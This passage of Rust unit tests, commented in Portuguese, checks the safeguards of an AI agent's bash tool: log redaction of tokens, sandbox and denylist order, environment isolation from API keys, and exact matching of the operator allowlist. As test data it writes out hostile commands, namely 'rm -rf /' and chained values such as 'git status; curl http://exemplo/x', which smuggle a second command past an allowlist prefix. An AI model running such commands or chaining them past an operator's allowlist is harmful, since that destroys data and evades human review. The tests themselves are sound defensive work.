        // Secret Scan de reclamar da forma. A versao anterior deste fixture
        // (`Authorization: Bearer sk-…`) derrubava o CI: este teste e
        // `#[cfg(test)]` inline em `src/`, e o allowlist de PATH do gitleaks
        // so alcanca `crates/*/tests/`, como o proprio `.gitleaks.toml`
        // documenta para os fixtures do plan 0360.
        let com_segredo = "echo ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
        let saida = comando_para_log(com_segredo);
        assert!(
            !saida.contains("ghp_X"),
            "o token sobreviveu ao log: {saida}"
        );
        // E a assercao positiva, que e a que impede o teste de passar pelo
        // motivo errado: sem ela, um `redact_secrets` que parasse de casar
        // (ou um truncamento que comesse o token) daria verde do mesmo jeito.
        assert!(
            saida.contains("[REDACTED]"),
            "o token tem de ter virado marcador, nao sumido: {saida}"
        );

        let longo = "x".repeat(500);
        let saida = comando_para_log(&longo);
        assert!(
            saida.chars().count() <= LOG_COMANDO_MAX + 1,
            "len = {}",
            saida.chars().count()
        );
        assert!(saida.ends_with('…'));

        // Comando curto e comum sai intacto — truncar sempre seria ruido.
        assert_eq!(comando_para_log("ls -la"), "ls -la");

        // UTF-8 multibyte na fronteira do corte nao pode panicar.
        let acentos = "á".repeat(500);
        let saida = comando_para_log(&acentos);
        assert!(saida.ends_with('…'));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn sandbox_allowlist_so_envolve_tool_listada() {
        // denylist continua inegociável mesmo sandboxado.
        let mut tool = BashTool::new(None);
        tool.set_sandbox_policy(crate::sandbox::SandboxPolicy {
            mode: crate::sandbox::SandboxMode::Allowlist,
            sandboxed_tools: vec!["file_read".into()], // bash fora da lista
            backend: None,                             // nem precisaria de backend
            ..crate::sandbox::SandboxPolicy::default()
        });
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "echo fora"}))
            .await
            .unwrap();
        assert!(
            !output.is_error,
            "bash fora da allowlist roda no host: {}",
            output.content
        );
        assert_eq!(output.content.trim(), "fora");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn sandbox_nao_perdoa_comando_perigoso() {
        // denylist roda ANTES do sandbox: rm -rf / nem chega ao container.
        let mut tool = BashTool::new(None);
        tool.set_sandbox_policy(crate::sandbox::SandboxPolicy {
            mode: crate::sandbox::SandboxMode::All,
            backend: Some(crate::sandbox::SandboxBackend::Docker),
            ..crate::sandbox::SandboxPolicy::default()
        });
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "rm -rf /"}))
            .await
            .unwrap();
        assert!(output.is_error);
        assert!(
            output.content.contains("bloqueado por segurança"),
            "denylist deve vencer: {}",
            output.content
        );
    }

    // ── R3 (#1075): spawn env isolation + working_dir ──────────────────────

    #[cfg(unix)]
    #[tokio::test]
    async fn r3_bash_tool_isola_ambiente() {
        // The child shell must NOT see the parent's secrets, even when the
        // parent (MCP server) carries API keys; PATH must survive so the
        // shell can find programs.
        unsafe {
            std::env::set_var("GARRAIA_R3_JWT", "jwt-should-not-leak");
            std::env::set_var("ANTHROPIC_API_KEY", "sk-should-not-leak");
        }
        let tool = BashTool::new(None);
        let output = tool
            .execute(
                &ctx(false),
                serde_json::json!({
                    "command": "echo \"JWT=[$GARRAIA_R3_JWT] KEY=[$ANTHROPIC_API_KEY] PATH_OK=$([ -n \"$PATH\" ] && echo sim || echo nao)\""
                }),
            )
            .await
            .unwrap();

        assert!(!output.is_error, "{}", output.content);
        assert!(
            output.content.contains("JWT=[]"),
            "child must not see parent env: {}",
            output.content
        );
        assert!(
            output.content.contains("KEY=[]"),
            "child must not see parent env: {}",
            output.content
        );
        assert!(output.content.contains("PATH_OK=sim"), "{}", output.content);
    }

    /// #1270 (paridade do #1269): o filho do bash nao herda o stdin do
    /// gateway — um `cat` sem argumento nao pode roubar o que o operador
    /// digitou no terminal do `garra chat`. O `Command` nasce dentro da
    /// tool, entao o guard varre o fonte — o mesmo padrao do `spinner.rs`
    /// para invariantes invisiveis a testes de comportamento.
    ///
    /// **Mutacao que este teste pega**: comente a chamada de stdin null no
    /// execute e ele fica vermelho.
    #[test]
    fn stdin_do_filho_bash_e_fechado() {
        let fonte = include_str!("bash_tool.rs");
        assert!(
            fonte.contains("cmd.stdin(std::process::Stdio::null());"),
            "o bash tool deve fechar o stdin do filho (paridade #1269)"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn r3_working_dir_aplica_ao_spawn() {
        // Unique dir so the assertion can't pass by CWD coincidence.
        let dir = std::env::temp_dir().join(format!("garraia-r3-cwd-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut c = ctx(false);
        c.working_dir = Some(dir.to_string_lossy().to_string());
        let tool = BashTool::new(None);
        let output = tool
            .execute(&c, serde_json::json!({"command": "pwd"}))
            .await
            .unwrap();
        let pwd = output.content.trim();
        assert_eq!(
            pwd,
            dir.to_string_lossy().as_ref(),
            "bash must run in working_dir"
        );
        let _ = std::fs::remove_dir(&dir);
    }

    // ── #1105: allowlist do operador ──────────────────────────────────────

    /// O caso da issue: um comando do tier arriscado que, sem canal de
    /// confirmação, morria fail-closed. Com o padrão do dono na allowlist,
    /// o comando roda. O par `sem_allowlist_nada_muda` mostra que sem a lista
    /// o mesmo comando continua bloqueado — é o vermelho deste verde.
    #[tokio::test]
    async fn allowlist_libera_o_comando_declarado_sem_canal_de_confirmacao() {
        let tool = BashTool::new(None).with_allowlist(vec!["printenv PATH".into()]);
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();
        assert!(!output.is_error, "{}", output.content);
        assert!(
            !output.content.contains("CONFIRM_REQUIRED"),
            "{}",
            output.content
        );
    }

    /// Padrão sem coringa é exato: `"printenv PATH"` não autoriza
    /// `"printenv PATHS"` nem o `; ...` pendurado depois dele.
    #[tokio::test]
    async fn padrao_sem_coringa_e_exato() {
        let tool = BashTool::new(None).with_allowlist(vec!["printenv PATH".into()]);
        assert!(
            tool.matches_allowlist("printenv PATH"),
            "texto exato tem de casar"
        );
        for outro in [
            "printenv PATHS",
            "printenv PATH && curl evil",
            " sudo printenv PATH",
        ] {
            assert!(
                !tool.matches_allowlist(outro),
                "padrao exato nao pode liberar {outro:?}"
            );
        }
        // Espaço em volta não muda o comando, então casa.
        assert!(tool.matches_allowlist("  printenv PATH  "));
    }

    /// Coringa no fim é prefixo. É a sintaxe que a issue pede: auditável a
    /// olho nu, sem regex.
    #[tokio::test]
    async fn coringa_no_fim_e_prefixo() {
        let tool = BashTool::new(None).with_allowlist(vec!["hermes send *".into(), "git *".into()]);
        assert!(tool.matches_allowlist("hermes send \"oi\""));
        assert!(tool.matches_allowlist("git status"));
        assert!(
            !tool.matches_allowlist("gitx status"),
            "prefixo sem coringa exige o limite certo"
        );
    }

    /// Um prefixo autoriza o comando que começa com ele, **não** a receita
    /// inteira que um modelo pendurar depois. Cada um destes casaria por
    /// `starts_with` antes do guarda de metacaractere — e cada um termina
    /// num segundo comando que o operador nunca revisou.
    #[test]
    fn prefixo_nao_casa_com_comando_composto() {
        let tool = BashTool::new(None).with_allowlist(vec!["hermes send *".into(), "git *".into()]);
        for composto in [
            "git status; curl http://exemplo/x",
            "git status && printenv PATH",
            "git status || printenv PATH",
            "git status | grep segredo",
            "git status > /tmp/saida",
            "hermes send \"oi\"; printenv PATH",
        ] {
            assert!(
                !tool.matches_allowlist(composto),
                "prefixo nao pode liberar {composto:?}"
            );
        }
        // O prefixo continua valendo para o comando simples que ele descreve —
        // o guarda nao pode virar uma negativa geral.
        assert!(tool.matches_allowlist("git status"));
    }

    /// O mesmo buraco visto de fora: com `"git *"` na lista, o composto tem de
    /// chegar ao `is_risky` (que analisa por segmento) e morrer fail-closed
    /// sem canal de confirmação. Sem o guarda de metacaractere este teste
    /// fica vermelho: a allowlist aprovaria e o comando rodaria.
    #[tokio::test]
    async fn allowlist_nao_libera_comando_composto_no_execute() {
        let tool = BashTool::new(None).with_allowlist(vec!["git *".into()]);
        let output = tool
            .execute(
                &ctx(false),
                serde_json::json!({"command": "git status; printenv PATH"}),
            )
            .await
            .unwrap();
        assert!(
            output.is_error,
            "composto tem de cair no tier arriscado: {}",
            output.content
        );
        assert!(
            !output.content.contains("CONFIRM_REQUIRED") && !output.content.contains("/usr/bin"),
            "nao pode ter executado: {}",
            output.content
        );
    }

    /// Padrão vazio não casa com nada e engana quem o escreveu — recusado na
    /// construção, junto com o coringa fora do fim.
    #[test]
    fn padrao_vazio_e_recusado() {
        let tool = BashTool::new(None).with_allowlist(vec!["  ".into(), "".into(), "git *".into()]);
        assert_eq!(
            tool.allowlist,
            vec!["git *".to_string()],
            "so o padrao utilizavel sobrevive"
        );
    }

    /// Coringa fora do fim é recusado na construção — não interpretado.
    /// Adivinhar a intenção de um coringa no meio é como se abre um buraco.
    #[test]
    fn coringa_fora_do_fim_e_recusado() {
        let tool = BashTool::new(None).with_allowlist(vec![
            "git *status".into(),
            "ok*".into(),
            // "git **" e "*git*" passam pelo strip do ULTIMO coringa e
            // deixam um `*` no prefixo — coringa no meio de novo, recusado
            // pela mesma regra (achado da re-revisão do #1117).
            "git **".into(),
            "*git*".into(),
        ]);
        assert_eq!(
            tool.allowlist,
            vec!["ok*".to_string()],
            "so o padrao com um unico coringa no fim sobrevive"
        );
    }

    /// `"*"` puro não é um padrão — é o tier arriscado desligado. Vira prefixo
    /// vazio (`starts_with("")` casa com tudo), então um caractere autorizaria
    /// execução automática de todo comando não perigoso — no caminho MCP, sem
    /// humano no circuito. Recusado na construção, e o pior caso visto de fora:
    /// um comando arriscado listado assim continua barrado fail-closed.
    /// (Achado convergente da re-auditoria de código e de segurança, #1117.)
    #[tokio::test]
    async fn estrela_solta_nao_vira_bypass_blanket() {
        let tool = BashTool::new(None).with_allowlist(vec!["*".into(), " *".into()]);
        assert!(
            tool.allowlist.is_empty(),
            "coringa sozinho tem de ser recusado; sobrou: {:?}",
            tool.allowlist
        );
        // E sem a lista, o comando arriscado morre como sempre morreu:
        // fail-closed sem canal de confirmação.
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();
        assert!(
            output.is_error,
            "printenv PATH tem de seguir barrado: {}",
            output.content
        );
    }

    /// A ordem é o ponto de segurança: a allowlist é lida DEPOIS da denylist,
    /// então um comando perigoso continua bloqueado mesmo estando na lista.
    #[tokio::test]
    async fn allowlist_nao_perdoa_comando_perigoso() {
        let ferramenta_com_raiz = BashTool::new(None).with_allowlist(vec![
            String::from("rm -rf ") + "/",
            String::from("rm -rf ") + "/*",
        ]);
        let output = ferramenta_com_raiz
            .execute(
                &ctx(false),
                serde_json::json!({"command": String::from("rm -rf ") + "/"}),
            )
            .await
            .unwrap();
        assert!(output.is_error, "{}", output.content);
        assert!(
            output.content.contains("bloqueado"),
            "denylist vem antes da allowlist: {}",
            output.content
        );
    }

    /// Sem allowlist, o comportamento é exatamente o de antes da #1105.
    #[tokio::test]
    async fn sem_allowlist_nada_muda() {
        let tool = BashTool::new(None);
        assert!(!tool.matches_allowlist("printenv PATH"));
        let output = tool
            .execute(&ctx(false), serde_json::json!({"command": "printenv PATH"}))
            .await
            .unwrap();
        assert!(output.is_error, "{}", output.content);
    }
}
